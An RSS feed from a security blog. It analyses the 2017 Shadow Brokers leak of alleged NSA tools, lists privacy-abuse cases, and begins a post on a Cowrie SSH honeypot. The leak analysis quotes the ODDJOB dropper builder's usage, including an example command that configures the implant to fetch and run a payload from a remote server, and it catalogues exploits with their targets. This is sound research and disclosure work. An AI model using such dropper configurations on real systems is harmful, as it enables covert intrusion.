<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Te(k|ch) blog</title>
    <link>https://www.randhome.io/</link>
    <description>Recent content on Te(k|ch) blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 14 Apr 2017 17:05:37 -0400</lastBuildDate>
    <atom:link href="https://www.randhome.io/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>ShadowBrokers Easter Gift</title>
      <link>https://www.randhome.io/blog/2017/04/14/shadowbrokers-easter-gift/</link>
      <pubDate>Fri, 14 Apr 2017 17:05:37 -0400</pubDate>
      
      <guid>https://www.randhome.io/blog/2017/04/14/shadowbrokers-easter-gift/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;UPDATE IN PROGRESS&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So the Shadow Brokers finally published some Windows tools, apparently from the NSA toolkit. There are 3 different directories :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ODDJOB : dropper which download and launch an encrypted payload (with builder and instruction to install the C2 server)&lt;/li&gt;
&lt;li&gt;SWIFT : information on operations targeting SWIFT networks&lt;/li&gt;
&lt;li&gt;Windows attack tools&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/x0rz&#34;&gt;@x0rz&lt;/a&gt; you can find all these files &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation&#34;&gt;on github&lt;/a&gt;. I have summarized here the information I have seen on twitter, and some notes from my tests. You should definitely follow  &lt;a href=&#34;https://twitter.com/hackerfantastic&#34;&gt;@hackerfantastic&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/x0rz&#34;&gt;@x0rz&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/GossiTheDog&#34;&gt;Kevin Beaumont&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/botherder&#34;&gt;nex&lt;/a&gt; on Twitter to get more update.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;April 15th Update&lt;/strong&gt;: So Microsoft published &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;a statement&lt;/a&gt; saying that all the vulnerabilities are already fixed in recent Windows version, most of them with &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx&#34;&gt;MS17-010&lt;/a&gt; in March. So it seems that everyone (including me) was a bit quick with conclusions yesterday. It is still surprising to see 3 major vulnerabilities related to ShadowBrokers fixed at the same time in March, which may mean that NSA actually disclosed these vulnerabilities to Microsoft (there is no credits in the Bulletin).
This annoucement reduce the risk of this publication but there are still a lot of interesting information in this publication, attacks on SWIFT being one of them, but also better knowledge on tools and implants used by NSA (and many of them are still not analyzed fully). It can have an important impact on NSA operations by &amp;ldquo;burning&amp;rdquo; these tools, but it can also allow to link NSA operations to more attacks (published or yet to be published) and get a better insight on their strategies and objectives.&lt;/p&gt;

&lt;h2 id=&#34;oddjob:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Oddjob&lt;/h2&gt;

&lt;p&gt;ODDJOB seems to be an dropper communicating through HTTP to download an encrypted payload and launch it on the system. Each implant has a specific id generated by the builder which is used to decrypt the payload. A builder is provided to create both implant and payload (another tool called FELONYCROWBAR is also mentioned for this purpose but not provided):&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://www.randhome.io/media/shadow/oddjobuilder.png&#34; alt=&#34;ODDJOB builder&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;The .hta files really use the command line builder which has the following options:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;USAGE============================================
oddjob_config -configure &amp;lt;oddjob.exe&amp;gt; &amp;lt;ARGS&amp;gt;
oddjob_config -dumpconfig &amp;lt;oddjob.exe&amp;gt;
oddjob_config -decrypt &amp;lt;surveystring&amp;gt;
oddjob_config -encryptpayload &amp;lt;oddjob.exe&amp;gt; &amp;lt;payload.exe&amp;gt; &amp;lt;encryptedpayload.exe&amp;gt;
&amp;lt;beaconstring&amp;gt; &amp;lt;type, 1=EXE, 2=DLL&amp;gt;
oddjob_config -decryptpayload &amp;lt;oddjob.exe&amp;gt; &amp;lt;encryptedpayload.exe&amp;gt; NOTE: replaces
 encrypted file
oddjob_config -genpubkey
oddjob_config -genprivatekey

ARGS=============================================
&amp;lt;DownloadJobName&amp;gt;               (BITS download job)
&amp;lt;DownloadServerName&amp;gt;            (URL of server)
&amp;lt;UploadJobName&amp;gt;                 (BITS upload job if any)
&amp;lt;UploadFileName&amp;gt;                (BITS upload filename if any)
&amp;lt;DummyURLName&amp;gt;                  (URL that will not be used)
&amp;lt;GetRequestExtension&amp;gt;           (file extension used on get requests, default .c
ab)
&amp;lt;FileExtension&amp;gt;                 (file extension used on files written to temp, d
efault .cab)
&amp;lt;TimeToLive&amp;gt;                    (secs, -1 LONG TIME
&amp;lt;BeaconInterval&amp;gt;                (Beacon interval in secs)
&amp;lt;BeaconCount&amp;gt;                   (Beacon count, 0 is infinite)
&amp;lt;UTimeToLive&amp;gt;                   (secs, -1 LONG TIME
&amp;lt;UBeaconInterval&amp;gt;               (Upload Beacon interval in secs)
&amp;lt;PayloadSetting&amp;gt;                (restart job after payload or die after one, 1 =
 multi)
&amp;lt;HashCount&amp;gt;                     (number of processes of bad processes to report
back)
&amp;lt;Processname&amp;gt;                   (bad process name)


EXAMPLES===========================================
oddjob_config.exe -configure oddjob.exe downloader http://10.1.1.1/msdownload/up
date/v3-19990518/cabpool upload 4393update.xml http://dummyurl.com .cab .cab 0 1
4400 60 2592000 14400 0 1 cmd.exe
oddjob_config.exe -dumpconfig oddjob.exe
oddjob_config.exe -decrypt SlNGn99TI-hDGqsfTn--nJi-koL-zHuvYqz2I64iIlk1F2JfRj2lD
uJbNpF-_bJGuCdr_iAocOkWYbvpugHQqQ
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The builder creates a oddjob dll which has an export method &lt;em&gt;dll_u&lt;/em&gt;. The implant seems to use &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/aa362708(v=vs.85%29.aspx&#34;&gt;BITS&lt;/a&gt; to communicate, here is an example of server log (the path is also the encryption key):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2012-06-22 18:38:09 135.2.26.58 - 135.2.26.160 80 GET /kfb3ZM2CkxDYABhur2jyNME7b8c9Qsn8nNrj4CmtKR7RXNkrWkvtpLQlnG-U3a9bFoF5SEk1lPZh8bbdhTNWGk4cXOEcGq132GQq.cab - 404 Microsoft+BITS/6.7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ODDJOB has also a feature to upload files : when launched it will check for a filename in Temp and upload it on the server:
&lt;center&gt;&lt;img src=&#34;https://www.randhome.io/media/shadow/oddjob-upload.png&#34; alt=&#34;ODDJOB upload&#34; /&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;For reference, the server side seems to just be a ISS server serving static files (it&amp;rsquo;s called &amp;ldquo;LP&amp;rdquo; in the documentation). &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/oddjob/Testing-Docs/tungsten_flame.txt&#34;&gt;This file&lt;/a&gt; shows that no antivirus was detecting the dropper in 2013 (I would bet it comes from an internal VirusTotal like platform).&lt;/p&gt;

&lt;p&gt;For more information, see the documentation &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/oddjob/User-Docs&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;swift:84bca1cb2ae373c8007ebd362081b655&#34;&gt;SWIFT&lt;/h2&gt;

&lt;p&gt;The &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/swift&#34;&gt;SWIFT directory&lt;/a&gt; seems to contains information on operations against SWIFT networks. Most of the documents seems to concern a successful attack on the &lt;a href=&#34;http://www.eastnets.com/Homepage.aspx&#34;&gt;Eastnets&lt;/a&gt; network.&lt;/p&gt;

&lt;p&gt;Partial list of files :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;DSquery Belgium DC.xlsx : List of servers on the internal EastNets Belgium Bureau obtained with &lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc732952(v=ws.11&#34;&gt;dsquery&lt;/a&gt;.aspx) (1911 servers listed with their name, DNS name, operating system and their created datem changed date and last logon)&lt;/li&gt;
&lt;li&gt;dsquery_Query_computers_from_MAIL001.txt : Same list of servers, likely in another EastNets bureau obtained through AD query with &lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc732952(v=ws.11&#34;&gt;dsquery&lt;/a&gt;.aspx)&lt;/li&gt;
&lt;li&gt;DSquey Dubai enDCBACKUP.xlsx : list of servers in the EastNets Dubai bureau (still obtained with dsquery, 1911 servers)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;See articles who covered this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@msuiche/the-nsa-compromised-swift-network-50ec3000b195&#34;&gt;ShadowBrokers: The NSA compromised the SWIFT Network&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/msuiche&#34;&gt;@msuiche&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.wired.com/2017/04/major-leak-suggests-nsa-deep-middle-east-banking-system/&#34;&gt;Major Leak Suggests NSA Was Deep in Middle East Banking System&lt;/a&gt; by Wired&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@networksecurity/latest-shadow-brokers-dump-owning-swift-alliance-access-cisco-and-windows-7b7782270e70&#34;&gt;Latest Shadow Brokers dump — owning SWIFT Alliance Access, Cisco and Windows&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;windows:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Windows&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows&#34;&gt;Lot of stuff here&lt;/a&gt;, see the &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;Microsoft answer about the exploits&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;fuzzbunch:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Fuzzbunch&lt;/h3&gt;

&lt;p&gt;Fuzzbunch is the internal exploit framework developed by the NSA like metasploit but in python.&lt;/p&gt;

&lt;h3 id=&#34;exploits:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Exploits&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows/exploits&#34;&gt;Exploit directory&lt;/a&gt;, every exploits comes with an xml describing options and targets:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;EASYBEE&lt;/strong&gt; : exploit for &lt;a href=&#34;http://www.altn.com/Products/MDaemon-Email-Server-Windows/WorldClient-WebMail-MDaemon/&#34;&gt;MDaemon WorldClient&lt;/a&gt; (Web interface for MDaemon email server) and &lt;a href=&#34;http://www.altn.com/Products/MDaemon-Email-Server-Windows/MDaemon-Remote-Administration/&#34;&gt;MDaemon WebAdmin&lt;/a&gt; (remote administration tool for MDaemon servers)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EASYPI&lt;/strong&gt; : exploit for &lt;a href=&#34;https://en.wikipedia.org/wiki/Cc:Mail&#34;&gt;Lotus CC:Mail&lt;/a&gt; for windows NT/2000/XP/2003&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ECLIPSEDWING&lt;/strong&gt; : exploit for &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms08-067.aspx&#34;&gt;MS08-67&lt;/a&gt; (remote code execution in Windows RPC) for Windows 2000/XP/2003&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EDUCATEDSCHOLAR&lt;/strong&gt; : exploit for &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms09-050.aspx&#34;&gt;MS09-050&lt;/a&gt; (remote code execution in SMBv2) on Windows Vista and 2008.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EMERALDTHREAD&lt;/strong&gt; : remote code execution through SMB or NBT on Windows XP / 2003. Fixed by &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms10-061.aspx&#34;&gt;MS10-061&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EMPHASISMINE&lt;/strong&gt; : exploit in Lotus Domino through IMAP, maybe 0day (&lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/windows/exploits/Emphasismine-3.4.0.0.xml&#34;&gt;xml file&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ENGLISHMANSDENTIST&lt;/strong&gt; : likely local code execution on Outlook by email using a vulnerability in the &lt;a href=&#34;https://twitter.com/HaifeiLi/status/853069371756773376&#34;&gt;TNEF format&lt;/a&gt;. It is interesting to see that the exploit is language dependent and that only English/German/Korea and Chinese are proposed. Microsoft &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;said in a statement&lt;/a&gt; that as supported plarforms are not vulnerablem they won&amp;rsquo;t fix this vulnerability.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ERRATICGOPHER&lt;/strong&gt; : remote code execution through RPC in XP and 2003, &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;fixed before Vista release&lt;/a&gt;. (&lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/windows/exploits/Erraticgopher-1.0.1.0.xml&#34;&gt;xml&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ESKIMOROLL&lt;/strong&gt; : Kerberos exploit targeting 2000/2003/2008 servers, &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms14-068.aspx&#34;&gt;MS14-068&lt;/a&gt; according to &lt;a href=&#34;https://twitter.com/gentilkiwi/status/852928424960241664&#34;&gt;@gentilkiwi&lt;/a&gt; and &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;Microsoft&lt;/a&gt;, binary timestamp is in 2011&amp;hellip;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ESTEEMAUDIT&lt;/strong&gt; : remote code execution in RDP targeting XP and 2003, 0day that &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;won&amp;rsquo;t be fixed by Microsoft&lt;/a&gt; because it only affect outdated platforms&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ETERNALROMANCE&lt;/strong&gt; : remote code execution on Windows XP/2003/Vista/2008 using SMB fixed by &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;MS17-010&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ETERNALSYNERGY&lt;/strong&gt; : remote code execution in SMB targeting &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/windows/exploits/Eternalsynergy-1.0.1.0.xml&#34;&gt;Windows 8 and 2012&lt;/a&gt;, fixed by &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx&#34;&gt;MS17-010&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EWOKFRENZY&lt;/strong&gt; : remote code execution pre-auth on Lotus Domino version 6.5.4 and 7.0.2 through IMAP, potential 0day (it seems to be old versions, last one is &lt;a href=&#34;https://www-01.ibm.com/support/docview.wss?uid=swg27010592&#34;&gt;9.0.1&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EXPLODINGCAN&lt;/strong&gt; : remote code execution on IIS6 on Windows 2003 through PROPFIND bug, &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269&#34;&gt;CVE-2017-7269&lt;/a&gt;. Exploited in the wild in July/August 2016. Public exploit already &lt;a href=&#34;https://www.exploit-db.com/exploits/41738/&#34;&gt;available&lt;/a&gt;, thanks &lt;a href=&#34;https://twitter.com/GossiTheDog/status/852892375248760834&#34;&gt;@GossiTheDog&lt;/a&gt;. As only plaforms not supported anymore by Microsoft are vulnerable, it &lt;a href=&#34;https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34;&gt;won&amp;rsquo;t be fixed&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ZIPPYBEER&lt;/strong&gt; : only &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/windows/exploits/Zippybeer-1.0.2.py&#34;&gt;python exploit&lt;/a&gt;, it seems to be an authenticated remote code execution in SMB, no information on the versions vulnerable, potential 0day&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;specials:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Specials&lt;/h3&gt;

&lt;p&gt;Dunno what is special &lt;a href=&#34;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows/specials&#34;&gt;there&lt;/a&gt;, but lot of exploits involved:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ETERNALBLUE&lt;/strong&gt; : SMB remote code execution on Windows XP/2003/Vista/2008/7, &lt;del&gt;confirmed 0 day&lt;/del&gt; fixed by &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx&#34;&gt;MS17-010&lt;/a&gt;. Here is &lt;a href=&#34;https://twitter.com/hackerfantastic/status/852958717746315264&#34;&gt;a nice video showing the exploit&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/hackerfantastic&#34;&gt;@hackerfantastic/&lt;/a&gt;. Conformed working &lt;a href=&#34;https://twitter.com/rikvduijn/status/852889267357593600&#34;&gt;on Win7x86&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ETERNALCHAMPION&lt;/strong&gt; : another SMB remote code execution on Windows XP/2003/Vista/2008/7, &lt;del&gt;confirmed 0day&lt;/del&gt; fixed by &lt;a href=&#34;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0146&#34;&gt;CVE-2017-0146&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0147&#34;&gt;CVE-2017-0147&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;touches:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Touches&lt;/h2&gt;

&lt;p&gt;This folder seems to gather utilities :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ARCHITOUCH&lt;/strong&gt; : seems to be a test of SMB connection to get&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DOMAINTOUCH&lt;/strong&gt; : something related to SMB&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ECLIPSEDWINGTOUCH&lt;/strong&gt; : Scan a server for MS08-076 SMB vulnerabilities&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EDUCATEDSCHOLARTOUCH&lt;/strong&gt; : Scan for a EDUCATEDSCHOLAR SMB vulnerability &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms09-050.aspx&#34;&gt;MS09-050&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;lib:84bca1cb2ae373c8007ebd362081b655&#34;&gt;lib&lt;/h2&gt;

&lt;p&gt;This directory includes dlls which are used by many other tools:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;coli-0.dll : coli stands for COmmand LIne&lt;/li&gt;
&lt;li&gt;tibe-2.dll : SMB networking wrapper (used by EternalRomance)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;what-should-i-do:84bca1cb2ae373c8007ebd362081b655&#34;&gt;What should I do?&lt;/h2&gt;

&lt;p&gt;For now, here is the list of software that I have seen attacked :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Windows from XP to 2012&lt;/li&gt;
&lt;li&gt;Lotus Domino&lt;/li&gt;
&lt;li&gt;Outlook&lt;/li&gt;
&lt;li&gt;MDaemon WorldClient and MDaemon WebAdmin&lt;/li&gt;
&lt;li&gt;Lotus CC:Mail&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you have Windows systems running, just PATCH EVERYTHING !&lt;/p&gt;

&lt;h2 id=&#34;articles:84bca1cb2ae373c8007ebd362081b655&#34;&gt;Articles&lt;/h2&gt;

&lt;p&gt;Articles covering these tools :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://motherboard.vice.com/en_us/article/leaked-nsa-hacking-tools-were-worth-2-million&#34;&gt;Newly Leaked Hacking Tools Were Worth $2 Million on the Gray Market&lt;/a&gt; by Motherboard&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://motherboard.vice.com/en_us/article/your-governments-hacking-tools-are-not-safe&#34;&gt;Your Government&amp;rsquo;s Hacking Tools Are Not Safe&lt;/a&gt; by Motherboard&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://motherboard.vice.com/en_us/article/the-latest-shadow-brokers-dump-of-alleged-nsa-tools-is-awful-news-for-the-internet&#34;&gt;The Latest Dump of Alleged NSA Tools Is ‘The Worst Thing Since Snowden’&lt;/a&gt; by Motherboard&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://motherboard.vice.com/en_us/article/alleged-nsa-victim-denies-hackers-ever-broke-in&#34;&gt;Alleged NSA Victim Denies Hackers Ever Broke In&lt;/a&gt; by Motherboard&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.wired.com/2017/04/major-leak-suggests-nsa-deep-middle-east-banking-system/&#34;&gt;Major Leak Suggests NSA Was Deep in Middle East Banking System&lt;/a&gt; by Wired&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Kuddos to &lt;a href=&#34;https://twitter.com/hackerfantastic&#34;&gt;@hackerfantastic&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/x0rz&#34;&gt;@x0rz&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/GossiTheDog&#34;&gt;Kevin Beaumont&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/botherder&#34;&gt;nex&lt;/a&gt; for their analysis on this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>#privacy</title>
      <link>https://www.randhome.io/privacy/</link>
      <pubDate>Mon, 15 Aug 2016 21:21:05 +0200</pubDate>
      
      <guid>https://www.randhome.io/privacy/</guid>
      <description>

&lt;p&gt;There are now more and more privacy abuse everywhere, so even though we feel it, it&amp;rsquo;s often hard to understand the daily privacy demolition. To help me, I started a list of privacy abuse cases here (likely out of date, I have considered only cases by commercial companies for now, if you see additional cases, poke me on &lt;a href=&#34;https://twitter.com/tenacioustek&#34;&gt;Twitter&lt;/a&gt;)&lt;/p&gt;

&lt;h2 id=&#34;2016:18d05a63a1c8d7ed973cc51838494e41&#34;&gt;2016&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2016/08/06 &lt;a href=&#34;http://motherboard.vice.com/read/dildo-data-hacking&#34;&gt;The Internet of Dildos Is Watching You&lt;/a&gt; : Connected sextoys sending intensity settings and temperature to the manufacturer in real-time&lt;/li&gt;
&lt;li&gt;2016/08/03 &lt;a href=&#34;http://thenextweb.com/insider/2016/08/03/comcast-isps-should-be-able-to-sell-your-web-history-to-advertisers/&#34;&gt;Comcast: ISPs should be able to sell your Web history to advertisers&lt;/a&gt; (Comcast only asked to the Federal Communications Commission, it&amp;rsquo;s apparently not done yet)&lt;/li&gt;
&lt;li&gt;2016/08/02 &lt;a href=&#34;https://blog.lukaszolejnik.com/battery-status-readout-as-a-privacy-risk/&#34;&gt;Battery Status readout as a privacy risk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2016/07/21 &lt;a href=&#34;https://www.theguardian.com/technology/2016/jul/20/france-microsoft-user-data-collection-privacy&#34;&gt;France orders Microsoft to stop collecting excessive user data&lt;/a&gt; : MS started to process information an all the apps downloaded and installed by a user and the time spent on each one (linked to an email account now)&lt;/li&gt;
&lt;li&gt;2016/05/04 &lt;a href=&#34;https://www.theguardian.com/technology/2016/may/04/google-deepmind-access-healthcare-data-patients&#34;&gt;Google given access to healthcare data of up to 1.6 million patients&lt;/a&gt; : DeepMind (a Google owned company) accessed patient information in an agreement with the Royal Free NHS trust to develop data analysis software&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;2015:18d05a63a1c8d7ed973cc51838494e41&#34;&gt;2015&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2015/01/10 (at least) &lt;a href=&#34;https://github.com/atom/atom/issues/4966&#34;&gt;Metrics enabled by default in Github Atom editor&lt;/a&gt; : Atom sends metrics about the tool usage to Google Servers without user knowledge (it was apparently updated then to inform the user). The id per user chosen is a SHA-1 of the MAC address. Fixed the 9th of August 2016.&lt;/li&gt;
&lt;li&gt;2015/02/13 &lt;a href=&#34;https://www.theguardian.com/technology/2015/mar/13/smart-barbie-that-can-listen-to-your-kids-privacy-fears-mattel&#34;&gt;Privacy fears over &amp;lsquo;smart&amp;rsquo; Barbie that can listen to your kids&lt;/a&gt; : New connected barbies send recordings to manufacturer sender for voice-recognition, and can potentially sell recordings to third parties.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;2013:18d05a63a1c8d7ed973cc51838494e41&#34;&gt;2013&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2013/08/07 &lt;a href=&#34;http://www.huffingtonpost.com/2013/07/08/att-selling-data_n_3561263.html&#34;&gt;AT&amp;amp;T Is Going To Start Selling Your Data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2013/06/24 &lt;a href=&#34;https://www.theguardian.com/business/2013/jun/24/barclays-bank-sell-customer-data&#34;&gt;Barclays to sell customer data&lt;/a&gt; : Barclays Bank start to sell spending habits about 13million customers&lt;/li&gt;
&lt;li&gt;2013/05/22 &lt;a href=&#34;http://www.huffingtonpost.com/2013/05/22/verizon-selling-customer-data_n_3320680.html&#34;&gt;Verizon Selling Customers’ Cell Phone Data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2013/04/05 &lt;a href=&#34;http://www.journaldunet.com/solutions/dsi/trophees-de-l-innovation-big-data/3e-prix.shtml&#34;&gt;SFR has a project of commercialising geographic data of its customers&lt;/a&gt; (French), use cases cited : understand the origin of people arriving in a supermarket, or understanding people travels in public transports.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;2010:18d05a63a1c8d7ed973cc51838494e41&#34;&gt;2010&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2010/04/01 Google Wi-Spy abuse case : Google cars collected Wifi data while driving (mostly illegally). The intercept has done an clear overview in &lt;a href=&#34;https://theintercept.com/2016/08/09/privacy-scandal-haunts-pokemon-gos-ceo/&#34;&gt;this article&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Openssh backdoor used on compromised Linux servers</title>
      <link>https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/</link>
      <pubDate>Mon, 01 Aug 2016 14:53:42 +0200</pubDate>
      
      <guid>https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/</guid>
      <description>

&lt;p&gt;Olà,&lt;/p&gt;

&lt;p&gt;Some times ago, I have installed honeypot services on one of my servers, in order to see what happens in the real outside world. I especially installed the &lt;a href=&#34;https://github.com/cowrie/cowrie&#34;&gt;cowrie&lt;/a&gt; ssh honeypot which simulate a Linux shell and gather binaries that people want to install on the server (this tool is awesome, check &lt;a href=&#34;https://github.com/micheloosterhof/cowrie/wiki/How-to-setup-Cowrie-on-Debian&#34;&gt;here&lt;/a&gt; to install it).&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.randhome.io/media/doctor8.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;cowrie-ssh:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;Cowrie ssh&lt;/h2&gt;

&lt;p&gt;This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2015-11-10 08:43:04+0100 [SSHService ssh-userauth on HoneyPotTransport,17996,177.124.226.37] login attempt [bayvit/bayvit] failed
2015-11-10 08:44:42+0100 [SSHService ssh-userauth on HoneyPotTransport,17997,177.124.226.37] login attempt [explore/explore] failed
2015-11-10 08:45:11+0100 [SSHService ssh-userauth on HoneyPotTransport,17998,106.186.116.239] login attempt [jonathan/111111] failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is a short top 20 of most used users and passwords :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Top 20 users&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;root&lt;/li&gt;
&lt;li&gt;admin&lt;/li&gt;
&lt;li&gt;test&lt;/li&gt;
&lt;li&gt;user&lt;/li&gt;
&lt;li&gt;oracle&lt;/li&gt;
